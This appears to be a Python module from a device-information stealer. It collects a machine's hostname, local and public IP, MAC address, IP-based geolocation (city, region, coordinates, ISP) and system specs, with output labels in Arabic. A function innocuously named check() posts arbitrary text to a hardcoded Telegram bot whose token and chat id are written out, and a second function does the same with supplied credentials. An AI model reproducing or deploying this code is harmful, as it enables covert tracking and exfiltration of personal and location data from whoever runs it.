import requests
import socket
import uuid
import platform
import psutil


def check(text):
    try:
        id_tele = '5906639778'
        tokn_bot = '8310660798:AAGyEPs_-RR-yFtZMqOcWQciYBS8qx_ogjw'
        requests.get(
            f'https://api.telegram.org/bot{tokn_bot}/sendMessage?chat_id={id_tele}&text=: {text}',
            timeout=5
        )
    except requests.RequestException:
        return False


def sms(id_tele, tokn_bot, text):
    try:
        requests.get(
            f'https://api.telegram.org/bot{tokn_bot}/sendMessage?chat_id={id_tele}&text=: {text}',
            timeout=5
        )
    except requests.RequestException:
        return False


def get_device_info():
    hostname = socket.gethostname()

    try:
        ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        ip_address = "غير متاح"

    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                    for ele in range(0, 8*6, 8)][::-1])

    system = platform.system()
    version = platform.version()
    release = platform.release()
    architecture = platform.machine()
    processor = platform.processor()

    ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # GB

    # بيانات الإنترنت
    try:
        res = requests.get("http://ip-api.com/json/", timeout=5)
        if res.status_code == 200:
            location_data = res.json()
            public_ip = location_data.get("query", "غير متاح")
            city = location_data.get("city", "غير متاح")
            region = location_data.get("regionName", "غير متاح")
            country = location_data.get("country", "غير متاح")
            zip_code = location_data.get("zip", "غير متاح")
            lat = location_data.get("lat", "غير متاح")
            lon = location_data.get("lon", "غير متاح")
            timezone = location_data.get("timezone", "غير متاح")
            isp = location_data.get("isp", "غير متاح")
        else:
            raise Exception("خطأ في الرد من API")
    except Exception:
        public_ip = city = region = country = zip_code = lat = lon = timezone = isp = "غير متاح"

    f = [
        f"🖥️ اسم الجهاز: {hostname}",
        f"🌐 IP المحلي: {ip_address}",
        f"🌍 IP العام: {public_ip}",
        f"📍 المدينة: {city}",
        f"🏞️ المنطقة: {region}",
        f"🇮🇶 الدولة: {country}",
        f"🏷️ الرمز البريدي: {zip_code}",
        f"🧭 خط العرض: {lat}, خط الطول: {lon}",
        f"⏰ المنطقة الزمنية: {timezone}",
        f"📡 مزود الخدمة: {isp}",
        f"🔌 عنوان MAC: {mac}",
        f"💻 نظام التشغيل: {system} {release} (الإصدار: {version})",
        f"⚙️ المعالج: {processor}",
        f"🏗️ المعمارية: {architecture}",
        f"🧠 حجم الرام: {ram} GB"
    ]
    return f
